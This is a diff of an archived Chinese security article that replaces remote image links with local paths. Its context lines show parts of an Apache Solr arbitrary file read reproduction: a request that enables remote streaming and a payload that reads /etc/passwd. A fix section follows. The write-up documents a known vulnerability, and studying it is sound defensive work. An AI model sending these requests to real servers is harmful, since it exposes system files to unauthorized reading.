@@ -50,7 +50,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/06Ta6WhxrnJmhMYZ-jAS4A)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LebHs2DGyKAEgZupcIbXWAgnQlIoLerewyAX3c3bLLg0iaTpJeUuGKrSWsicRvLMXwCIbhkUC8GqGibg/640?wx_fmt=gif)
+![](../../.resource/remote/b0fe0298eeab4319f4d76ce35572067c6fc6ed29b7bdc8ded2041f9d2e012282.gif)
 
 原创稿件征集
 
@@ -106,11 +106,11 @@ https://archive.apache.org/dist/lucene/solr/8.8.0/solr-8.8.0.tgz
 
 访问：http://ip:8983 可以看到创建的核心
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBGMPaPBYGx3icDqBjVZbcuaicQpmQibt5ib39qr3bQPtG9wQxics5TJgA4Ag/640?wx_fmt=png)
+![](../../.resource/remote/7307481fb3d3a935d3a25cd646b240043bf546d259b35bb2e8f43e49aafb90a3.png)
 
 实际场景下可以看到会有很多核心
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBg7eevKMQeKTM6wzZdN601BXJE6ibj3IXwm5cYTWddlwaYAMld8BKgug/640?wx_fmt=png)
+![](../../.resource/remote/e8c1b2e0d998be0f86ffc1e250f29d8ae86c5a1e066b1dc0af97f1a10bfa809d.png)
 
 **漏洞复现**
 
@@ -122,7 +122,7 @@ https://archive.apache.org/dist/lucene/solr/8.8.0/solr-8.8.0.tgz
 {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBfRGTJX0ltwSTox2gqviaUeP4ficwEnqIaIln0SicSPcUdUKsUMxmvmMaA/640?wx_fmt=png)
+![](../../.resource/remote/2c8ab01e954888d0eb6a3ada5f33806a7751ac1af70bab2665a4535603b658d5.png)
 
 即可开启远程流。
 
@@ -145,7 +145,7 @@ Content-Length: 29
 stream.url=file:///etc/passwd
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBX1PyrQqZ60JIE1B3ibXTdfIxpeicz0YYIbRibhiaJXoeibjJUUR9UktmibEA/640?wx_fmt=png)
+![](../../.resource/remote/bcac27ed119bb4f18a730b05226b801b6e71da5bed4c96e11c3a2b40f37620f9.png)
 
 **漏洞修复**  
 
@@ -159,11 +159,11 @@ stream.url=file:///etc/passwd
 
 **赛博回忆录：公布某 Solr 最新版任意文件读取 0day**
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMSDWpcCKDPr8n1d4F3vrKYDS4kNicB9icWMKEv6BXAKrcic7PbwicUdtia8SQ/640?wx_fmt=gif)
+![](../../.resource/remote/5337bf800596619e9e657fe266d2548de246558aaaeba11f72752b361fd229ff.gif)
 
 逻辑漏洞系列实战训练
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMSDWpcCKDPr8n1d4F3vrKYDS4kNicB9icWMKEv6BXAKrcic7PbwicUdtia8SQ/640?wx_fmt=gif)
+![](../../.resource/remote/5337bf800596619e9e657fe266d2548de246558aaaeba11f72752b361fd229ff.gif)
 
 胖白老师带你从 0 开始挖洞
 
@@ -177,7 +177,7 @@ stream.url=file:///etc/passwd
 
 快扫码报名👇  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMS305JuFE1XSNVPffNp8VJa8AYPRhQCOo719dSBWctzLdBYH8ADoX9Ig/640?wx_fmt=png)
+![](../../.resource/remote/ee962b9303701be971c517fe16bd8b0fe1a6440f48a1522ff35505ba91624f7e.png)
 
 ---
 
